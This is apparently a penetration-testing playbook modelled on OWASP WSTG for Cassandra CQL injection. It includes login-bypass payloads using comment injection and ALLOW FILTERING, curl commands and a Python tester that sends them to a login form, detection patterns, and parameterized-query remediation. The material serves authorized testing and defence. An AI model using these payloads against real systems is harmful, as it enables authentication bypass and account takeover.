---
name: wstg-inpv-05.10
description: "Testing for SQL Injection - Cassandra (CQL)"
category: input-validation
owasp_id: WSTG-INPV-05.10
version: "1.0.0"
author: cyberstrike-official
tags: [injection, input-validation, sqli, cql, wstg, inpv, cassandra, nosql]
tech_stack: [cassandra, cql]
cwe_ids: [CWE-89, CWE-943]
chains_with: [wstg-inpv-01, wstg-inpv-02]
prerequisites: [wstg-conf-01, wstg-conf-02]
severity_boost:
  wstg-inpv-02: "Cassandra CQL Injection reaching a login/authentication query allows an ALLOW FILTERING-based comment injection to bypass credential checks entirely, achieving full Authentication Bypass = Critical (Account Takeover / Unauthenticated Admin Access)"
---

# wstg-inpv-05.10

## Test ID

WSTG-INPV-05.10

## Test Name

Testing for SQL Injection - Cassandra (CQL)

## High-Level Description

Apache Cassandra is a free and open-source distributed wide-column store NoSQL database, queried via CQL (Cassandra Query Language) — a SQL-like dialect with significant structural differences from relational SQL. CQL Injection occurs when user input is concatenated unsanitized into a CQL statement, most commonly in authentication (`WHERE user = '<input>'`) queries. Because CQL is intentionally limited compared to full SQL, the classic SQLi playbook (UNION-based extraction, `OR 1=1` tautologies, `SLEEP()` time-based blind, and subqueries) largely does **not** apply — testing must instead focus on comment-based structural manipulation (`/* ... */`) and the `ALLOW FILTERING` clause, particularly for authentication bypass.

---

## What to Check

- [ ] Single-quote (`'`) breaks the CQL statement / triggers a CQL syntax error
- [ ] Login/authentication fields (username/password) concatenated directly into a `WHERE` clause
- [ ] Comment injection (`/* ... */`) used to neutralize the remainder of the original query and append attacker-controlled conditions
- [ ] `ALLOW FILTERING` abuse to force a non-indexed, always-broader scan that bypasses an intended equality check
- [ ] Confirm CQL's structural limitations apply (do NOT waste test cycles on techniques that cannot work in CQL — see below)
- [ ] Error messages disclosing CQL syntax details, keyspace/table names, or driver identity (`InvalidRequest`, `com.datastax.driver`, `cassandra.db`)

### CQL Injection Limitations (do not attempt these — they will not work against Cassandra)

- **No `JOIN` / `UNION`** — Cassandra is non-relational; cross-table queries via `UNION SELECT` are structurally impossible in CQL.
- **No metadata functions** — CQL has no `DATABASE()` / `USER()` equivalents for retrieving database metadata inline.
- **No `OR` operator** — CQL rejects tautology payloads such as `WHERE col1='a' OR col2='b'`; always-true `OR`-based conditions cannot be built.
- **No `SLEEP()` / time-delay function** — classic time-based blind injection is not viable against CQL.
- **No subqueries / nested statements** — `WHERE column=(SELECT column FROM table LIMIT 1)` style nesting is rejected.

---

## How to Test

### Step 1: Cassandra/CQL Detection

```bash
#!/bin/bash
TARGET="https://target.com/login"

echo "[*] Testing for Cassandra/CQL backend..."

# Single-quote error trigger on username field
curl -s -X POST "$TARGET" -d "username=admin'&password=x" | \
  grep -iE "InvalidRequest|com\.datastax|cassandra\.db|line [0-9]+:[0-9]+ mismatched input"

# Comment-based structural break attempt (see Login Bypass below)
curl -s -X POST "$TARGET" -d "username=admin'/*&password=*/and pass>'"
```

### Step 2: Cassandra CQL Injection Tester

```python
#!/usr/bin/env python3
"""
Apache Cassandra CQL Injection Tester
Note: CQL has no UNION, no OR, no SLEEP(), no subqueries - this tester
intentionally does NOT include those classes of payload.
"""

import requests
import re

class CassandraCQLiTester:
    def __init__(self, url):
        self.url = url
        self.findings = []
        self.session = requests.Session()

    # Cassandra / CQL error patterns
    CASSANDRA_ERRORS = [
        r"InvalidRequest",
        r"com\.datastax\.driver",
        r"cassandra\.db",
        r"line \d+:\d+ mismatched input",
        r"unconfigured (table|columnfamily)",
        r"ALLOW FILTERING",
    ]

    # CQL-specific payloads - login bypass via comment injection only.
    # UNION-based, OR-based, and time-based classes are intentionally omitted (unsupported by CQL).
    CQL_PAYLOADS = {
        'detection': [
            "'",
        ],
        'login_bypass': [
            # Example #1: comment out password check, force ALLOW FILTERING scan
            {"username": "admin' ALLOW FILTERING; %00", "password": "ANY"},
            # Example #2: comment-delimited injection reshaping the WHERE clause
            {"username": "admin'/*", "password": "*/and pass>'"},
        ],
    }

    def detect_cassandra(self, param):
        """Detect if backend is Apache Cassandra / CQL"""
        print(f"[*] Detecting Cassandra/CQL database...")

        for payload in self.CQL_PAYLOADS['detection']:
            try:
                response = self.session.post(self.url, data={param: payload})

                for pattern in self.CASSANDRA_ERRORS:
                    if re.search(pattern, response.text, re.IGNORECASE):
                        print(f"[+] Cassandra/CQL database detected!")
                        return True

            except Exception:
                pass

        return False

    def test_login_bypass(self, username_field='username', password_field='password'):
        """Test CQL login bypass via comment injection / ALLOW FILTERING"""
        print(f"\n[*] Testing Cassandra CQL login bypass...")

        baseline = self.session.post(self.url, data={username_field: 'invaliduser_xyz', password_field: 'wrongpass'})

        for creds in self.CQL_PAYLOADS['login_bypass']:
            try:
                data = {username_field: creds['username'], password_field: creds['password']}
                response = self.session.post(self.url, data=data)

                if response.status_code != baseline.status_code or \
                   len(response.text) != len(baseline.text) or \
                   'welcome' in response.text.lower() or 'dashboard' in response.text.lower():
                    print(f"[VULN] Possible CQL login bypass!")
                    print(f"  Payload: {data}")
                    self.findings.append({
                        'type': 'Cassandra CQL Login Bypass',
                        'payload': str(data),
                        'severity': 'Critical'
                    })
                    return True

            except Exception:
                pass

        return False

    def run_tests(self, username_field='username', password_field='password'):
        """Run all Cassandra/CQL injection tests"""
        if self.detect_cassandra(username_field):
            self.test_login_bypass(username_field, password_field)
        else:
            # Even without a confirmed error signature, login bypass is worth testing directly
            self.test_login_bypass(username_field, password_field)

        self.generate_report()

    def generate_report(self):
        """Generate findings report"""
        print("\n" + "="*60)
        print("CASSANDRA CQL INJECTION REPORT")
        print("="*60)

        if not self.findings:
            print("\nNo Cassandra CQLi vulnerabilities found.")
        else:
            for f in self.findings:
                print(f"\n[{f['severity']}] {f['type']}")
                if 'payload' in f:
                    print(f"  Payload: {f['payload'][:90]}")

# Usage
tester = CassandraCQLiTester("https://target.com/login")
tester.run_tests(username_field='username', password_field='password')
```

### Step 3: Manual Login Bypass Walkthrough

The two documented bypass techniques both rely on CQL comment syntax (`/* ... */`) to restructure the server-side query rather than on tautologies (which CQL rejects):

**Example #1 — `ALLOW FILTERING` + null-byte truncation:**

```
username: admin' ALLOW FILTERING; %00
password: ANY
```

**Example #2 — comment-delimited clause injection:**

```
username: admin'/*
password: */and pass>'
```

This reshapes the server-side query into:

```sql
SELECT * FROM users WHERE user = 'admin'/*' AND pass = '*/and pass>'' ALLOW FILTERING;
```

The `/* ... */` block comments out the original password equality check, and `ALLOW FILTERING` forces Cassandra to permit the now-broader (non-indexed) predicate instead of rejecting the query outright.

---

## Tools

| Tool         | Purpose                                    |
| ------------- | -------------------------------------------- |
| Burp Suite    | Manual request tampering / repeater          |
| cqlsh         | Cassandra CQL shell (post-access validation) |
| curl          | Manual payload delivery                       |

Note: SQLMap has no CQL/Cassandra `--dbms` support — Cassandra CQL injection testing is manual, driven by the comment-injection and `ALLOW FILTERING` techniques above rather than automated UNION/boolean/time-based scanning.

---

## Example Commands/Payloads

### Cassandra Comment

```sql
/* Cassandra Comment */
```

### Cassandra Login Bypass

**Example #1**

```sql
username: admin' ALLOW FILTERING; %00
password: ANY
```

**Example #2**

```sql
username: admin'/*
password: */and pass>'
```

Resulting server-side query:

```sql
SELECT * FROM users WHERE user = 'admin'/*' AND pass = '*/and pass>'' ALLOW FILTERING;
```

### Detection (curl)

```bash
TARGET="https://target.com/login"

# CQL syntax error trigger
curl -s -X POST "$TARGET" -d "username=admin'&password=x" | grep -Ei "InvalidRequest|com\.datastax|cassandra\.db"

# Login bypass attempt (Example #2)
curl -s -X POST "$TARGET" --data-urlencode "username=admin'/*" --data-urlencode "password=*/and pass>'"
```

### Detection Pattern

| Signal | Meaning |
| ------ | ------- |
| `InvalidRequest` / `com.datastax.driver` / `cassandra.db` in response | Error-based confirmation of Cassandra/CQL backend |
| `line X:Y mismatched input` | CQL parser syntax error, confirms unsanitized input reaches the CQL statement |
| Response indicates authenticated session after comment-injection payload | Successful CQL login bypass via `/* */` + `ALLOW FILTERING` |
| Application rejects `OR`-based or `UNION`-based payloads outright | Expected — CQL does not support these constructs; not evidence of "no vulnerability" |
| No timing difference for any delay payload | Expected — CQL has no `SLEEP()` equivalent; do not rely on timing oracles |

---

## Remediation

```java
// Java - DataStax driver, parameterized (bound) statement
PreparedStatement stmt = session.prepare("SELECT * FROM users WHERE user = ? AND pass = ?");
BoundStatement bound = stmt.bind(username, password);
session.execute(bound);
```

```python
# Python - cassandra-driver, parameterized query
from cassandra.cluster import Cluster

session = Cluster().connect()
stmt = session.prepare("SELECT * FROM users WHERE user = ? AND pass = ?")
session.execute(stmt, (username, password))
```

Additional hardening:
- Never string-concatenate user input into CQL statements, including for `ALLOW FILTERING` predicates.
- Hash and compare credentials server-side rather than embedding the plaintext password into a `WHERE` clause equality check at all.
- Disable/avoid `ALLOW FILTERING` on any query built even partially from user input — it exists to bypass Cassandra's normal indexed-query restriction and should never be reachable via untrusted data.
- Apply strict input validation rejecting `'`, `/*`, `*/`, and control characters (e.g. null byte `%00`) in identity fields before they reach the query layer.

---

## Risk Assessment

| Finding                                  | CVSS | Severity |
| ------------------------------------------ | ---- | -------- |
| Cassandra CQL Authentication Bypass         | 9.8  | Critical |
| Cassandra CQL Injection (error-based, no auth impact) | 6.5  | Medium   |

---

## CWE Categories

| CWE ID      | Title                                   |
| ----------- | ---------------------------------------- |
| **CWE-89**  | SQL Injection                            |
| **CWE-943** | Improper Neutralization of Special Elements in Data Query Logic |

---

## References

- [OWASP WSTG - Testing for SQL Injection (WSTG-INPV-05)](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection)
- [PayloadsAllTheThings - Cassandra Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/Cassandra%20Injection.md)
- [Cassandra injection vulnerability triggered - DATADOG](https://web.archive.org/web/20230130053010/https://docs.datadoghq.com/fr/security/default_rules/appsec-cass-injection-vulnerability-trigger/)
- [Investigating CQL injection in Apache Cassandra - Mehmet Leblebici](https://web.archive.org/web/20251213065510/https://www.invicti.com/blog/web-security/investigating-cql-injection-apache-cassandra)

---

## Checklist

```
[ ] Cassandra/CQL database detected (syntax error / driver signature)
[ ] Confirmed CQL structural limitations (no UNION/OR/SLEEP/subqueries) - not misreported as false negatives
[ ] Comment injection (/* */) tested on authentication fields
[ ] ALLOW FILTERING abuse tested for login bypass (Example #1 and #2 payloads)
[ ] Error messages checked for keyspace/table/driver disclosure
[ ] Findings documented
```
